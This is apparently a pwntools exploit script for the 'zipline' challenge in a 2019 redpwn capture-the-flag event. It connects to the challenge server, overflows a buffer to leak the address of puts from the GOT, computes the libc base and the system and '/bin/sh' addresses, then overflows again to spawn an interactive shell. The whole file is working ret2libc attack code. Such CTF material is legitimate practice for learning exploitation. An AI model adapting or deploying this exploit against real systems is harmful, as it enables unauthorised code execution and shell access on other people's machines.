from pwn import *

zipline = 0x080494ce
puts_plt = 0x08049090
puts_got = 0x804c020

puts_offset = 0x0005f140
system_offset = 0x0003a940
binsh_offset = 0x15902b

# str to int
u = make_unpacker(32, endian='little', sign='unsigned') # 4 byte value


#p = process('zipline')
#gdb.attach(p)

p = remote('chall.2019.redpwn.net', 4005)

print p.recv()

# BOF and jump to puts and print puts@GOT entry to leak libc address
payload = 'A'*22 + p32(puts_plt) + p32(zipline) + p32(puts_got)
p.sendline(payload)

# calc libc base address and usefull functions addresses
leak = p.recv()
leak = p.recv()
leak = (u(leak[0:4]))
print 'puts address = ' + hex(leak)
base_address = leak - puts_offset
system = base_address + system_offset
binsh = base_address + binsh_offset
print 'libc base_address = ' + hex(base_address)
print 'system address = ' + hex(system)
print '/bin/sh address = ' + hex(binsh)

# BOF and jump to system with `/bin/sh` param
payload = 'A'*22 + p32(system) + p32(0x55555555) + p32(binsh)
p.sendline(payload)

print '---------------------'
p.interactive()